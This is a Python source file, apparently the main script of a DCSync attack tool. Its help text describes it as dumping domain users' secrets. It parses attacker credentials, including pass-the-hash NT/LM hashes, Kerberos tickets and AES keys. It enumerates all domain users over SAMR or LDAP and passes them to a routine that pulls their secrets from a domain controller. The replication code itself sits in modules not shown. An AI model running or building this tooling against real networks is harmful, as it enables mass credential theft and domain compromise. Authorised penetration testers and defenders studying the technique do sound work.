
from impacket.examples import utils
from getpass import getpass

import argparse
import sys
import os

from DCSync.structures.Credentials import Credentials
from DCSync.structures.Target import Target
from DCSync.core.DCSync import DCSync
from DCSync.core.Logger import Logger
from DCSync.network.LDAP import LDAP
from DCSync.network.RPC import SAMR
from DCSync import __banner__

class Arguments:

    debug: bool
    ts: bool
    no_pass: bool
    hashes: str
    doKerberos: bool
    doSimpleBind: bool
    aesKey: bool
    dc_ip: str
    port: int
    domain: str
    username: str
    password: str
    remote_name: str
    method: str
    method_port: int
    just_user: str
    just_user_file: str
    just_users: set = None

    def __init__(self) -> None:
        self.__parser = argparse.ArgumentParser(add_help=True, description="A python script for dumping domain users secrets using DCSync method.")
        self.__parser.add_argument("-debug", default=False, action="store_true", help="Turn DEBUG output ON. (Default: False)")
        self.__parser.add_argument("-ts", action="store_true", help="Adds timestamp to every logging output")

        # Credentials
        credentials = self.__parser.add_argument_group("Credentials")
        credentials.add_argument("-no-pass", action="store_true", help="Don't ask for password (useful for -k or when using proxychains)")
        credentials.add_argument("-hashes", action="store", metavar="[LMHASH]:NTHASH", help="NT/LM hashes. LM hash can be empty.")
        credentials.add_argument("-k", action="store_true", help="Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the ones specified in the command line.")
        credentials.add_argument("-aesKey", action="store", metavar="hex key", help="AES key to use for Kerberos Authentication (128 or 256 bits).")

        # Connection
        connection = self.__parser.add_argument_group("Connection")
        connection.add_argument("-dc-ip", action="store", metavar="ip address", help="IP Address of the domain controller. If omitted it will use the domain part (FQDN) specified in the target parameter")
        connection.add_argument("-port", type=int, action="store", help="Port of the domain controller. If omitted it will try to authenticate by the default port.", default=135)
        connection.add_argument("-method", action="store", help="Method used to get all the users.", default="samr", choices=["samr", "ldap"])
        
        # LDAP
        ldap = self.__parser.add_argument_group("LDAP")
        ldap.add_argument("-method-port", type=int, action="store", help="Change the default port for the -method option (Actually only apply to LDAP method).")
        ldap.add_argument("-simple-bind", action="store_true", help="Use simple bind to connect to the DC LDAP (Only using -method ldap option).")

        # User
        filters = self.__parser.add_argument_group("Filters")
        filters.add_argument("-just-user", action="store", help="Extract secrets for this specific principal (User / Machine).")
        filters.add_argument("-just-user-file", action="store", help="Extract secrets for multiples principals (User / Machine) in the file.")

        self.__parser.add_argument("target", action="store", help="[[domain/]username[:password]@]<targetName or address>")

    def parseArgs(self) -> None:
        if len(sys.argv) == 1:
            self.__parser.print_help()
            sys.exit(1)

        self._args          = self.__parser.parse_args()
        self.debug          = self._args.debug
        self.ts             = self._args.ts
        self.no_pass        = self._args.no_pass
        self.hashes         = self._args.hashes
        self.doKerberos     = self._args.k
        self.doSimpleBind   = self._args.simple_bind
        self.aesKey         = self._args.aesKey
        self.dc_ip          = self._args.dc_ip
        self.port           = self._args.port
        self.method         = self._args.method
        self.method_port    = self._args.method_port
        self.just_user      = self._args.just_user
        self.just_user_file = self._args.just_user_file

        self.domain, self.username, self.password, self.remote_name = utils.parse_target(self._args.target)
        if not len(self.domain):
            self.domain, self.username, self.password = utils.parse_credentials(self._args.target)
            self.remote_name = None
        
        if not len(self.password) and self.hashes is None and not self.no_pass and self.aesKey is None:
            self.password = getpass("Password:")

        if self.hashes is None:
            self.hashes = ""
        
        if ":" not in self.hashes and len(self.hashes):
            self.hashes = "aad3b435b51404eeaad3b435b51404ee:%s" % (self.hashes)
        elif len(self.hashes):
            lm, nt = self.hashes.split(":", 1)
            if not len(lm):
                self.hashes = "aad3b435b51404eeaad3b435b51404ee%s" % (self.hashes)

        if self.just_user_file:
            if not os.path.exists(self.just_user_file):
                Logger(self.debug, self.ts).error(f"File {self.just_user_file} doesn't exists")
                exit(1)

            if not os.path.isfile(self.just_user_file):
                Logger(self.debug, self.ts).error(f"File {self.just_user_file} is not a file")
                exit(1)
            
            with open(self.just_user_file) as f:
                self.just_users = set(f.read().splitlines())

            self.method = "file"

def main():
    print(__banner__)

    arguments = Arguments()
    arguments.parseArgs()

    logger = Logger(arguments.debug, arguments.ts)
    credentials = Credentials(arguments.username, arguments.password, arguments.domain, arguments.hashes, arguments.aesKey, arguments.doKerberos, arguments.doSimpleBind)
    target = Target(arguments.dc_ip or arguments.remote_name or arguments.domain, arguments.port, arguments.method_port)
    dcsync = DCSync(target, credentials, logger, arguments.method)
    
    # Only sync a user
    if arguments.just_user:
        users = [arguments.just_user]
    # Sync multiples users
    elif arguments.method == "file":
        users = arguments.just_users

    elif arguments.method == "samr":
        samr = SAMR(credentials, target, logger)
        users = samr.getAllUsers()

    elif arguments.method == "ldap":
        ldap = LDAP(credentials, target, logger)
        users = ldap.getAllUsers()

    else:
        raise NotImplementedError
        
    dcsync.sync(users)
